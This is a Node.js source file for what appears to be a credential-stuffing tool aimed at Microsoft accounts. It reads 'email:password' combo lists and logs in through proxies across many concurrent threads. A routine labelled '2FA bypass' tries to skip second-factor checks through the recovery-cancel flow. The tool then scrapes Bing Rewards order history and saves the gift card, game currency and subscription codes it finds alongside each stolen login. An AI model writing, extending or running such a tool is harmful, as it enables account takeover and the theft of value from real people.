// ============================================================
//  Microsoft Rewards Scraper (PRS) — Node.js Port
//  Scrapes rewards.bing.com/redeem/orderhistory for codes
//  Supports categories: Minecraft, Roblox, LoL, Overwatch,
//  Sea of Thieves, Game Pass, Gift Cards, All
//  100% same logic as prs.py
// ============================================================

const { proxiedFetch } = require("./proxy-manager");

// ── Category Configuration ───────────────────────────────────

const CATEGORY_CONFIG = {
  Minecraft: {
    keywords: ["minecraft", "minecoins", "minecraft minecoins", "minecoin", "minecraft coins"],
    codePattern: /[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}/,
    displayName: "Minecraft",
    amountPattern: /(\d+)\s*(?:minecoins|coins|minecraft coins)/i,
  },
  Roblox: {
    keywords: ["roblox", "robux", "roblox robux", "roblox digital", "roblox card"],
    codePattern: /[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}/,
    displayName: "Roblox",
    amountPattern: /(\d+)\s*(?:robux|rbx|r\$)/i,
  },
  "League of Legends": {
    keywords: ["league of legends", "lol", "riot points", "rp", "league rp"],
    codePattern: /[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}/,
    displayName: "League of Legends",
    amountPattern: /(\d+)\s*(?:rp|riot points)/i,
  },
  Overwatch: {
    keywords: ["overwatch", "overwatch coins", "overwatch league tokens", "owl tokens"],
    codePattern: /[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}/,
    displayName: "Overwatch",
    amountPattern: /(\d+)\s*(?:coins|tokens|league tokens)/i,
  },
  "Sea of Thieves": {
    keywords: ["sea of thieves", "sea thieves", "ancient coins", "sof coins"],
    codePattern: /[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}/,
    displayName: "Sea of Thieves",
    amountPattern: /(\d+)\s*(?:coins|ancient coins)/i,
  },
  "Game Pass": {
    keywords: ["game pass", "xbox game pass", "gamepass", "xbox gamepass"],
    codePattern: /[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}/,
    displayName: "Game Pass",
    amountPattern: /(\d+)\s*(?:month|months|day|days)/i,
  },
  GIFTCARDS: {
    keywords: ["gift card", "giftcard", "gift cards", "amazon", "steam", "playstation", "xbox", "nintendo", "target", "starbucks", "subway", "doordash", "uber eats", "uber", "walmart"],
    codePattern: /[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}/,
    displayName: "Gift Cards",
    amountPattern: /\$(\d+)(?:\.\d{2})?/,
  },
  All: {
    keywords: [],
    codePattern: /[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}(?:-[A-Z0-9]{4})?(?:-[A-Z0-9]{4})?/,
    displayName: "All Categories",
    amountPattern: null,
  },
};

// Code patterns in order of specificity (longest first)
const CODE_PATTERNS = [
  /\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b/g,
  /\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b/g,
  /\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b/g,
];

// Words to exclude (not actual codes)
const EXCLUDE_WORDS = new Set([
  "SWEEPSTAKES", "STATUS", "WINORDER", "CONTEST", "PLAGUE", "REQUIEM",
  "CUSTOM", "BUNDLEORDER", "SURFACE", "PROORDER", "SERIES", "POINTS",
  "DONATION", "CHILDREN", "RESEARCH", "HOSPITALORDE", "EDUCATION",
  "EMPLOYMENTOR", "RIGHTS", "YOUORDER", "SEDSORDER", "ATAORDER",
  "CARDORDER", "MICROSOFT", "PRESENTKORT", "KRORDER", "OFT-PRE",
  "DIGITAL", "COINSORDER", "MOEDAS", "OVERWATCHORD", "MONEDASORDER",
  "ASSINATURA", "GRATUITA", "SPOTIFY", "PREMIUM", "MESESORDER",
  "PRESENTE", "RESALET", "NOURORDER", "FOUNDATIONOR", "YACOUB",
  "LEAGUE", "LEGENDS", "RPORDER", "OVERWATCH", "GAME", "PASS",
  "MINECOINS", "ROBUX", "GIFT", "CARD", "ORDER", "CODE", "FOUND",
  "DIGITAL-CODE", "REDEMPTION", "REDEEM", "DOWNLOAD", "INSTANT",
  "DELIVERY", "ONLINE", "ACCESS", "CONTENT", "DLC", "EXPANSION",
  "SEASON", "TOKEN", "CURRENCY", "VIRTUAL", "ITEM",
]);

const SFTTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en";

const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";

// ── Cookie Session ───────────────────────────────────────────

class CookieSession {
  constructor() {
    this.cookies = {};
  }

  extractCookies(res) {
    const setCookies = res.headers.getSetCookie?.() || [];
    for (const sc of setCookies) {
      const [pair] = sc.split(";");
      const [name, ...valParts] = pair.split("=");
      if (name) this.cookies[name.trim()] = valParts.join("=").trim();
    }
  }

  getCookieString() {
    return Object.entries(this.cookies)
      .map(([k, v]) => `${k}=${v}`)
      .join("; ");
  }

  async get(url, headers = {}) {
    let currentUrl = url;
    let maxRedirects = 10;
    let res;

    while (maxRedirects-- > 0) {
      res = await proxiedFetch(currentUrl, {
        redirect: "manual",
        headers: {
          "User-Agent": UA,
          Cookie: this.getCookieString(),
          ...headers,
        },
      });
      this.extractCookies(res);

      if (res.status >= 300 && res.status < 400) {
        const loc = res.headers.get("location");
        if (!loc) break;
        currentUrl = new URL(loc, currentUrl).href;
        try { await res.text(); } catch {}
        continue;
      }
      break;
    }

    const text = await res.text();
    return { res, text, url: currentUrl };
  }

  async post(url, body, headers = {}) {
    let currentUrl = url;
    let maxRedirects = 10;
    let method = "POST";
    let currentBody = body;
    let res;

    while (maxRedirects-- > 0) {
      res = await proxiedFetch(currentUrl, {
        method,
        redirect: "manual",
        headers: {
          "User-Agent": UA,
          Cookie: this.getCookieString(),
          ...headers,
        },
        body: currentBody,
      });
      this.extractCookies(res);

      if (res.status >= 300 && res.status < 400) {
        const loc = res.headers.get("location");
        if (!loc) break;
        currentUrl = new URL(loc, currentUrl).href;
        method = "GET";
        currentBody = undefined;
        try { await res.text(); } catch {}
        continue;
      }
      break;
    }

    const text = await res.text();
    return { res, text, url: currentUrl };
  }
}

// ── Xbox OAuth Login (exact match to prs.py) ─────────────────

async function getUrlPostSFTTag(session) {
  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      const { text } = await session.get(SFTTAG_URL, {
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        Connection: "keep-alive",
        "Upgrade-Insecure-Requests": "1",
      });

      let match = text.match(/value=\\"(.+?)\\"/s) ||
                  text.match(/value="(.+?)"/s) ||
                  text.match(/sFTTag:'(.+?)'/s) ||
                  text.match(/sFTTag:"(.+?)"/s) ||
                  text.match(/name="PPFT".*?value="(.+?)"/s);
      if (!match) continue;
      const sFTTag = match[1];

      match = text.match(/"urlPost":"(.+?)"/s) ||
              text.match(/urlPost:'(.+?)'/s) ||
              text.match(/urlPost:"(.+?)"/s) ||
              text.match(/<form.*?action="(.+?)"/s);
      if (!match) continue;

      const urlPost = match[1].replace(/&amp;/g, "&");
      return { urlPost, sFTTag };
    } catch {}
    await new Promise(r => setTimeout(r, 100));
  }
  return { urlPost: null, sFTTag: null };
}

async function getXboxRps(session, email, password, urlPost, sFTTag) {
  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      const body = new URLSearchParams({
        login: email,
        loginfmt: email,
        passwd: password,
        PPFT: sFTTag,
      });

      const { text, url: finalUrl } = await session.post(urlPost, body.toString(), {
        "Content-Type": "application/x-www-form-urlencoded",
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        Connection: "close",
      });

      // Check for access_token in URL fragment
      if (finalUrl.includes("#") && finalUrl !== SFTTAG_URL) {
        try {
          const hash = new URL(finalUrl).hash.substring(1);
          const params = new URLSearchParams(hash);
          const token = params.get("access_token");
          if (token && token !== "None") return { token, status: "ok" };
        } catch {}
      }

      // 2FA bypass via recovery cancel
      if (text.includes("cancel?mkt=")) {
        const iptMatch = text.match(/(?<="ipt" value=").+?(?=">)/);
        const ppridMatch = text.match(/(?<="pprid" value=").+?(?=">)/);
        const uaidMatch = text.match(/(?<="uaid" value=").+?(?=">)/);
        const actionMatch = text.match(/(?<=id="fmHF" action=").+?(?=" )/);

        if (iptMatch && ppridMatch && uaidMatch && actionMatch) {
          const formBody = new URLSearchParams({
            ipt: iptMatch[0],
            pprid: ppridMatch[0],
            uaid: uaidMatch[0],
          });

          const { text: retText } = await session.post(actionMatch[0], formBody.toString(), {
            "Content-Type": "application/x-www-form-urlencoded",
          });

          const returnUrlMatch = retText.match(/(?<="recoveryCancel":\{"returnUrl":")(.+?)(?=",)/);
          if (returnUrlMatch) {
            const { url: finUrl } = await session.get(returnUrlMatch[0]);
            if (finUrl.includes("#")) {
              const hash = new URL(finUrl).hash.substring(1);
              const params = new URLSearchParams(hash);
              const token = params.get("access_token");
              if (token && token !== "None") return { token, status: "ok" };
            }
          }
        }
      }

      // 2FA indicators
      if (["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]
        .some(v => text.includes(v))) {
        return { token: null, status: "2fa" };
      }

      // Invalid credentials
      const lower = text.toLowerCase();
      if (["password is incorrect", "account doesn't exist", "that microsoft account doesn't exist",
        "sign in to your microsoft account", "tried to sign in too many times", "help us protect your account"]
        .some(v => lower.includes(v))) {
        return { token: null, status: "invalid" };
      }
    } catch {}
    await new Promise(r => setTimeout(r, 100));
  }
  return { token: null, status: "error" };
}

// ── Category Detection (exact match to prs.py) ───────────────

function detectCategoryFromTitle(title, fullRowText) {
  const text = (fullRowText || title).toLowerCase();

  if (["overwatch", "overwatch coins", "owl tokens"].some(k => text.includes(k))) return "Overwatch";
  if (["sea of thieves", "sea thieves", "ancient coins", "monedas", "alijo secreto", "tesoro oculto", "lost chest", "secret cache"].some(k => text.includes(k))) return "Sea of Thieves";
  if (["roblox", "robux"].some(k => text.includes(k))) return "Roblox";
  if (["league of legends", "lol", "riot points", "puntos riot", "ra-"].some(k => text.includes(k))) return "League of Legends";
  if (["game pass", "xbox game pass", "gamepass"].some(k => text.includes(k))) return "Game Pass";
  if (["minecraft", "minecoins", "monedas minecraft"].some(k => text.includes(k))) return "Minecraft";
  if (["gift card", "giftcard", "amazon", "steam", "playstation", "xbox", "nintendo", "target", "starbucks", "subway", "doordash", "uber eats", "uber", "walmart", "spotify", "premium", "tarjeta regalo"].some(k => text.includes(k))) return "GIFTCARDS";

  return "Unknown";
}

function extractCodeInfo(title, category, fullRowText) {
  const config = CATEGORY_CONFIG[category] || CATEGORY_CONFIG.All;
  const lower = title.toLowerCase();

  // For 'All', detect actual category first
  if (category === "All") {
    const detected = detectCategoryFromTitle(title, fullRowText);
    if (detected !== "Unknown") return extractCodeInfo(title, detected, fullRowText);
  }

  // Extract amount
  let amount = null;
  if (config.amountPattern) {
    const m = lower.match(config.amountPattern);
    if (m) amount = m[1];
  }
  if (!amount) {
    const m = lower.match(/(\d+)\s*(?:monedas|coins|pièces|moedas)/);
    if (m) amount = m[1];
  }

  if (category === "Minecraft" && amount) return `${amount} MINECOINS CODE FOUND`;
  if (category === "Roblox" && amount) return `${amount} ROBUX CODE FOUND`;
  if (category === "League of Legends" && amount) return `${amount} RP CODE FOUND`;
  if (category === "Overwatch" && amount) return `${amount} OVERWATCH COINS CODE FOUND`;
  if (category === "Sea of Thieves" && amount) return `${amount} ANCIENT COINS CODE FOUND`;
  if (category === "Game Pass") {
    if (amount) {
      if (lower.includes("month")) return `${amount} MONTH GAME PASS CODE FOUND`;
      if (lower.includes("day")) return `${amount} DAY GAME PASS CODE FOUND`;
    }
    return "GAME PASS CODE FOUND";
  }
  if (category === "GIFTCARDS") {
    const types = [
      ["amazon", "AMAZON"], ["steam", "STEAM"], ["playstation", "PLAYSTATION"],
      ["psn", "PLAYSTATION"], ["xbox", "XBOX"], ["nintendo", "NINTENDO"],
      ["target", "TARGET"], ["starbucks", "STARBUCKS"], ["subway", "SUBWAY"],
      ["doordash", "DOORDASH"], ["uber eats", "UBER EATS"], ["uber", "UBER EATS"],
      ["walmart", "WALMART"],
    ];
    for (const [kw, label] of types) {
      if (lower.includes(kw)) return amount ? `$${amount} ${label} GIFT CARD FOUND` : `${label} GIFT CARD FOUND`;
    }
    if (lower.includes("spotify") || lower.includes("premium")) {
      if (lower.includes("3 month")) return "3 MONTHS SPOTIFY PREMIUM FOUND";
      if (lower.includes("1 month")) return "1 MONTH SPOTIFY PREMIUM FOUND";
      if (lower.includes("6 month")) return "6 MONTHS SPOTIFY PREMIUM FOUND";
      if (lower.includes("12 month") || lower.includes("1 year")) return "12 MONTHS SPOTIFY PREMIUM FOUND";
      return "SPOTIFY PREMIUM FOUND";
    }
    return amount ? `$${amount} GIFT CARD FOUND` : "GIFT CARD FOUND";
  }

  return `${category.toUpperCase()} CODE FOUND`;
}

// ── Simple HTML helpers (no cheerio needed) ──────────────────

function stripTags(html) {
  return html.replace(/<[^>]*>/g, "").trim();
}

function extractTableRows(html) {
  const rows = [];
  // Match <tr> blocks
  const trRegex = /<tr[^>]*>([\s\S]*?)<\/tr>/gi;
  let trMatch;
  while ((trMatch = trRegex.exec(html)) !== null) {
    const rowHtml = trMatch[0];
    const cells = [];
    const cellRegex = /<t[dh][^>]*>([\s\S]*?)<\/t[dh]>/gi;
    let cellMatch;
    while ((cellMatch = cellRegex.exec(rowHtml)) !== null) {
      cells.push({ html: cellMatch[1], text: stripTags(cellMatch[1]) });
    }
    if (cells.length >= 3) {
      rows.push({ html: rowHtml, cells, text: stripTags(rowHtml) });
    }
  }
  return rows;
}

function extractCodesFromText(text) {
  const codes = [];
  for (const pattern of CODE_PATTERNS) {
    pattern.lastIndex = 0;
    let m;
    while ((m = pattern.exec(text.toUpperCase())) !== null) {
      const code = m[0];
      if (code.includes("*")) continue;
      if (EXCLUDE_WORDS.has(code)) continue;
      const alnum = code.replace(/-/g, "").length;
      if (alnum < 12) continue;
      const parts = code.split("-");
      if (parts.length < 3) continue;
      if (!codes.includes(code)) codes.push(code);
    }
  }
  return codes;
}

// ── Order History Scraping (exact match to prs.py) ───────────

async function scrapeOrderHistory(session, selectedCategory) {
  const results = [];
  const seenCodes = new Set();

  try {
    // Navigate to order history
    let { text } = await session.get("https://rewards.bing.com/redeem/orderhistory", {
      Referer: "https://rewards.bing.com/",
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    });

    // Handle JavaScript auto-submit pages (fmHF form)
    if (text.includes("fmHF") || text.includes("JavaScript required to sign in")) {
      const formActionMatch = text.match(/<form[^>]*(?:id="fmHF"|name="fmHF")[^>]*action="([^"]+)"/);
      if (formActionMatch) {
        let action = formActionMatch[1];
        if (action.startsWith("/")) action = "https://login.live.com" + action;

        // Extract all input fields
        const inputRegex = /<input[^>]*name="([^"]*)"[^>]*value="([^"]*)"[^>]*>/g;
        const formData = new URLSearchParams();
        let inputMatch;
        while ((inputMatch = inputRegex.exec(text)) !== null) {
          formData.append(inputMatch[1], inputMatch[2]);
        }

        await session.post(action, formData.toString(), {
          "Content-Type": "application/x-www-form-urlencoded",
        });

        // Retry fetching order history
        const retry = await session.get("https://rewards.bing.com/redeem/orderhistory", {
          Referer: "https://rewards.bing.com/",
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        });
        text = retry.text;
      }
    }

    // Extract verification token
    let verificationToken = "";
    const tokenMatch = text.match(/name="__RequestVerificationToken"[^>]*value="([^"]*)"/);
    if (tokenMatch) verificationToken = tokenMatch[1];

    // Parse rows
    const rows = extractTableRows(text);

    for (const row of rows) {
      const fullRowText = row.text;

      // Check for "Get Code" button (OrderDetails_)
      const getCodeButtonMatch = row.html.match(/id="OrderDetails_[^"]*"[^>]*data-actionurl="([^"]*)"/);

      if (getCodeButtonMatch) {
        let actionUrl = getCodeButtonMatch[1].replace(/&amp;/g, "&");
        const orderTitle = row.cells[2]?.text || "";
        const orderDate = row.cells[1]?.text || "";
        const detectedCategory = detectCategoryFromTitle(orderTitle, fullRowText);
        const codeInfo = extractCodeInfo(orderTitle, detectedCategory, fullRowText);

        if (actionUrl.startsWith("/")) actionUrl = "https://rewards.bing.com" + actionUrl;

        try {
          // POST to get the code (exact same as prs.py)
          const postData = new URLSearchParams();
          if (verificationToken) postData.append("__RequestVerificationToken", verificationToken);

          const { text: codeHtml } = await session.post(actionUrl, postData.toString(), {
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          });

          let code = null;

          // Try tango-credential-key/value divs
          const tangoKeyRegex = /<div[^>]*class=['"]tango-credential-key['"][^>]*>([\s\S]*?)<\/div>/gi;
          const tangoValRegex = /<div[^>]*class=['"]tango-credential-value['"][^>]*>([\s\S]*?)<\/div>/gi;
          const keys = [];
          const vals = [];
          let km;
          while ((km = tangoKeyRegex.exec(codeHtml)) !== null) keys.push(stripTags(km[1]).toUpperCase());
          while ((km = tangoValRegex.exec(codeHtml)) !== null) vals.push(stripTags(km[1]));

          for (let i = 0; i < keys.length; i++) {
            if ((keys[i].includes("CODE") || keys[i].includes("PIN")) && vals[i] && !vals[i].includes("*")) {
              code = vals[i];
              break;
            }
          }

          // Fallback: PIN: or CODE: patterns
          if (!code) {
            const pinMatch = codeHtml.match(/PIN\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})/i);
            if (pinMatch && !pinMatch[1].includes("*")) code = pinMatch[1];
          }
          if (!code) {
            const codeMatch = codeHtml.match(/CODE\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})/i);
            if (codeMatch && !codeMatch[1].includes("*")) code = codeMatch[1];
          }

          // Fallback: clipboard buttons
          if (!code) {
            const clipMatch = codeHtml.match(/data-clipboard-text="([^"]+)"/);
            if (clipMatch && clipMatch[1].trim().length >= 15 && !clipMatch[1].includes("*")) {
              code = clipMatch[1].trim();
            }
          }

          // Fallback: any code pattern in HTML
          if (!code) {
            const extracted = extractCodesFromText(codeHtml);
            if (extracted.length > 0) code = extracted[0];
          }

          // Extract redemption URL for gift cards
          let redemptionUrl = null;
          const infoLower = codeInfo.toLowerCase();
          if (["gift", "card", "$", "amazon", "spotify"].some(k => infoLower.includes(k))) {
            const redemptionPatterns = [
              /<div[^>]*class=['"]tango-credential-key['"][^>]*><a[^>]*href=['"]([^'"]*?)['"][^>]*>Redemption URL<\/a><\/div>/i,
              /<a[^>]*href=['"]([^'"]*?)['"][^>]*>Redemption URL<\/a>/i,
              /<a[^>]*href=['"]([^'"]*?)['"][^>]*>Redeem<\/a>/i,
              /<a[^>]*href=['"]([^'"]*?)['"][^>]*>Claim<\/a>/i,
              /href="([^"]*redeem[^"]*)"/i,
              /href="([^"]*claim[^"]*)"/i,
              /Redemption URL:\s*(https?:\/\/[^\s<>"']+)/i,
            ];
            for (const pattern of redemptionPatterns) {
              const urlMatch = codeHtml.match(pattern);
              if (urlMatch) {
                redemptionUrl = urlMatch[1].trim().replace(/\n/g, "").replace(/ /g, "");
                break;
              }
            }
          } else if (code && code.replace(/-/g, "").length <= 8) {
            const urlMatch = codeHtml.match(/<a[^>]*href="([^"]*)"[^>]*>Redemption URL<\/a>/i);
            if (urlMatch) redemptionUrl = urlMatch[1];
          }

          if (code) {
            const codeKey = `${code}:${orderTitle}`;
            if (!seenCodes.has(codeKey)) {
              seenCodes.add(codeKey);
              results.push({
                code,
                info: codeInfo,
                category: detectedCategory,
                date: orderDate || new Date().toISOString(),
                redemptionUrl: redemptionUrl || "",
              });
            }
          }
        } catch {}
      } else if (!row.html.includes("ResendEmail_")) {
        // Fallback: direct code extraction from row text
        const orderTitle = row.cells[2]?.text || "";
        const orderDate = row.cells[1]?.text || "";
        const codeCell = row.cells[3]?.text || row.cells[2]?.text || "";

        const foundCodes = extractCodesFromText(codeCell);
        for (const code of foundCodes) {
          const detected = detectCategoryFromTitle(orderTitle, fullRowText);
          const info = extractCodeInfo(orderTitle, detected, fullRowText);
          const codeKey = `${code}:${orderTitle}`;
          if (!seenCodes.has(codeKey)) {
            seenCodes.add(codeKey);

            let redemptionUrl = null;
            const infoLower = info.toLowerCase();
            if (["gift", "card", "$", "amazon", "spotify"].some(k => infoLower.includes(k))) {
              const urlMatch = row.html.match(/<a[^>]*href="([^"]*)"[^>]*>Redemption URL<\/a>/i);
              if (urlMatch) redemptionUrl = urlMatch[1];
            }

            results.push({
              code,
              info,
              category: detected,
              date: orderDate || new Date().toISOString(),
              redemptionUrl: redemptionUrl || "",
            });
          }
        }
      }
    }

    // If no table rows found, try extracting from entire page text
    if (rows.length === 0) {
      const allCodes = extractCodesFromText(text);
      for (const code of allCodes) {
        const codeKey = `${code}:page`;
        if (!seenCodes.has(codeKey)) {
          seenCodes.add(codeKey);
          results.push({
            code,
            info: "CODE FOUND",
            category: "Unknown",
            date: new Date().toISOString(),
            redemptionUrl: "",
          });
        }
      }
    }
  } catch (err) {
    // Silently fail — account-level error
  }

  return results;
}

// ── Single Account Check ─────────────────────────────────────

async function checkSingleAccount(email, password, category) {
  const session = new CookieSession();

  // Step 1: Get OAuth tokens
  const { urlPost, sFTTag } = await getUrlPostSFTTag(session);
  if (!urlPost || !sFTTag) return { email, status: "error", codes: [] };

  // Step 2: Login
  const { token, status } = await getXboxRps(session, email, password, urlPost, sFTTag);

  if (!token) {
    return { email, status: status || "invalid", codes: [] };
  }

  // Step 3: Scrape order history
  const codes = await scrapeOrderHistory(session, category);

  // Filter by category if not "All"
  let filtered = codes;
  if (category !== "All") {
    filtered = codes.filter(c => c.category === category || c.category === "Unknown");
  }

  return {
    email,
    status: filtered.length > 0 ? "hit" : "valid",
    codes: filtered,
  };
}

// ── Multi-Account Scraper ────────────────────────────────────

/**
 * @param {string[]} accounts - Array of "email:password"
 * @param {string} category - Category to filter
 * @param {number} threads - Concurrency
 * @param {Function} onProgress - (done, total, result) callback
 * @param {AbortSignal} signal - Optional abort
 * @returns {{ results: Array, allCodes: Array }}
 */
async function scrapeRewards(accounts, category = "All", threads = 10, onProgress, signal) {
  const { runPool } = require("./worker-pool");
  const results = [];
  const allCodes = [];

  await runPool({
    items: accounts,
    concurrency: threads,
    signal,
    scope: "rewards-scraper",
    runner: async (account) => {
      const [email, password] = account.split(":");
      if (!email || !password) {
        return { result: { email: account, status: "invalid", codes: [] } };
      }
      try {
        const r = await checkSingleAccount(email.trim(), password.trim(), category);
        if (r.codes && r.codes.length > 0) {
          allCodes.push(...r.codes.map(c => ({ ...c, email, password })));
        }
        return { result: r };
      } catch {
        return { result: { email, status: "error", codes: [] } };
      }
    },
    onResult: (r, done, total) => {
      results.push(r);
      onProgress?.(done, total, r);
    },
  });

  return { results, allCodes };
}

// ── Exports ──────────────────────────────────────────────────

function getCategoryList() {
  return Object.keys(CATEGORY_CONFIG);
}

function getCategoryFileName(category) {
  if (category === "Unknown") return "unknown";
  return category.toLowerCase().replace(/ /g, "");
}

module.exports = {
  scrapeRewards,
  getCategoryList,
  getCategoryFileName,
  CATEGORY_CONFIG,
};
